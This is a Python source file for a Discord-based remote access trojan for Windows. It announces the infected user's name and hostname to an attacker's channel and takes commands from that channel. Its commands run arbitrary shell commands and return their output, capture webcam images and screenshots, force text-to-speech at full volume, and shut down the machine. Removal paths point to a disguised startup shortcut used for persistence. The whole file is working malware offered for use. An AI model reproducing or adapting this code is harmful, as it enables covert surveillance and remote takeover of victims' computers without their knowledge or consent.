TOKEN = '%yourclientoken%'
import os
import discord
import pyautogui
import cv2          #use 'pip install opencv-python==4.5.3.56'
from pynput.keyboard import Key, Controller, Listener
import time
import sys
import requests
import pyttsx3
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from pynput.keyboard import Key
import random
import subprocess

print("init")

def hexagons():

    client = discord.Client()
    USERNAME = os.getenv('USERNAME')
    HOSTNAME = os.getenv('COMPUTERNAME')
    @client.event
    async def on_ready():
        channel = client.get_channel({%yourchannelname%)
        await channel.send(f"im online <@%yourping%> on {USERNAME}@{HOSTNAME}")
        print("logged")

    @client.event
    async def on_message(message):
        mess = str(message.content)

        if message.channel.name == 'bot-talk':
            if mess.lower() == 'ping':
                await message.channel.send("_moans_ \ndeeper~")
                return

            if mess.startswith("$"):
                engine_getch = message.content
                engine_getch_parsed = engine_getch[1:]

                devices = AudioUtilities.GetSpeakers()
                interface = devices.Activate(
                    IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                volume = cast(interface, POINTER(IAudioEndpointVolume))
                volume.SetMasterVolumeLevel(-0.0, None)

                engine = pyttsx3.init()
                engine.setProperty("rate", 160)
                engine.setProperty('voice', engine.getProperty('voices')[random.randint(0, 1)].id)

                engine.say(fr"{engine_getch_parsed}")
                engine.runAndWait()
                await message.channel.send(fr"spoke _{engine_getch_parsed}_")
                return

            if mess.startswith("^"):
                without_stdout = message.content
                without_stdout_pasrsed = without_stdout[1:]
                returned_value = subprocess.call(without_stdout_pasrsed, shell=True)  # returns the exit code in unix
                if returned_value == 0:
                    await message.channel.send(fr"successfully executed `{without_stdout_pasrsed}` in command prompt")
                else:
                    await message.channel.send("`failure`")

            if mess.startswith("%"):
                with_stdout = message.content
                with_stdout_parsed = with_stdout[1:]
                from subprocess import PIPE, Popen
                command = fr"{with_stdout_parsed}"
                with Popen(command, stdout=PIPE, stderr=subprocess.STDOUT, shell=True) as process:
                    stuff = process.communicate()[0].decode("utf-8")
                    await message.channel.send(f"`~{stuff}`")

            if mess.lower() == 'ls':
                await message.channel.send(
                    "`ping: checks if i'm horny\npoweroff: fucks the machine\nshow: shows camera input from all the cameras\nshot: shows current screen\nstop: fucks the program\nguillotine: removes all the files from the system\n$[]: says the message after $\n^[]: executes the command after ^ without stdout in cmd\n%[]: executes the command after % with stdout in cmd`")
                return

            if mess.lower() == 'poweroff':
                os.system("shutdown -s -t 5")
                await message.channel.send(message.author.mention + " `fucking off`")
                return

            if mess.lower() == 'show':
                for i in range(3):
                    cam_port = i
                    cam = cv2.VideoCapture(cam_port)
                    result, image = cam.read()
                    cv2.imwrite(fr"C:\Users\{USERNAME}\AppData\Roaming\Addons\py.jpg", image)
                    await message.channel.send(file=discord.File(fr"C:\Users\{USERNAME}\AppData\Roaming\Addons\py.jpg"))
                    os.remove(fr"C:\Users\{USERNAME}\AppData\Roaming\Addons\py.jpg")
                return

            if mess.lower() == 'guillotine':
                os.remove(fr"C:\Users\{USERNAME}\AppData\Roaming\Addons\s.exe")
                os.remove(fr"C:\Users\{USERNAME}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\NeberoLogin.lnk")
                await message.channel.send("_hexagons has been removed._")
                return

            if mess.lower() == 'shot':
                keyboard = Controller()  # this is to make sure the taskbar is captured
                keyboard.press(Key.cmd)  # as i have auto hide taskbar
                keyboard.release(Key.cmd)
                time.sleep(1)

                image = pyautogui.screenshot()  # screenshot with taskbar
                image.save(fr"C:\Users\{USERNAME}\AppData\Roaming\Addons\s.png")
                await message.channel.send(file=discord.File(fr"C:\Users\{USERNAME}\AppData\Roaming\Addons\s.png"))
                os.remove(fr"C:\Users\{USERNAME}\AppData\Roaming\Addons\s.png")
                return

            if mess.lower() == 'stop':
                await message.channel.send(message.author.mention + " successfully fucked")
                sys.exit()

    client.run(TOKEN)
def internet_on(sleep_time):
    url = "http://www.google.com/"
    timeout = 5
    time.sleep(sleep_time)
    try:
        time.sleep(sleep_time)
        request = requests.get(url, timeout=timeout)
        print("Connected to the Internet")
        hexagons()
    except (requests.ConnectionError, requests.Timeout) as exception:
        print("No internet connection.")
########################################################################################################################
for i in range(4):
    v = 60
    while (v <= 900):
        internet_on(v)
        v = v + 60
sys.exit()
